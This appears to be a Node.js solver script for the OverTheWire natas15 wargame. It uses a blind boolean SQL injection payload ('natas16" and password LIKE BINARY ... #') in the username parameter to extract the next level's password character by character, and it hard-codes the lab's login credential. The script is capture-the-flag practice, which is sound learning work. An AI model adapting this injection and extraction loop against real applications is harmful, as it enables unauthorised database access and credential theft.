(function () {
  let request = require('request'),
      // url = "http://natas15.natas.labs.overthewire.org/",
      url = "natas15.natas.labs.overthewire.org/",
      username = "natas15",
      password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
      // auth = "Basic " + new Buffer(username + ":" + password).toString("base64");
      chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
      filtered = [],
      pass = '',
      uri = `http://${username}:${password}@${url}index.php`;


  for( let i = 0; i < chars.length; i += 1 ) {
    let char = chars[i];
  request(
    {
      url: uri,
      qs: {
        username: `natas16" and password LIKE BINARY "%${char}%" #`
      }
      // headers: {
      //   "Authorization": auth
      // }
    },(function(c,i) { return function(error, response, body) {
      if( error ) { return console.log( error ); };
      if( body.match('exists') ) {
        filtered[i] = c;
        // filtered += char;
        // console.log( response.request.uri.query );
      };
    };
    })( char, i ));
  };
  setTimeout(() => {
    let filter = filtered.join('');
    let index = 0;
    recurse( index, filter );
  }, 2000);

  function recurse( index, list ) {
    let char = list[index];
    request(
      {
        url: uri,
        qs: {
          username:`natas16" and password LIKE BINARY "${pass}${char}%" #`
        }
      },(error, response, body) => {
        if( error ) { console.log( error ); };
        if( body.match('exists') ) {
          pass += char;
          if( pass.length === 32 ) {
            console.log( pass );
            console.log( "DONE!" );
          } else {
            index = 0;
            console.log( pass );
            recurse( index, list );
          }
        } else {
          index += 1;
          recurse( index, list );
        };
      });
  };
})()
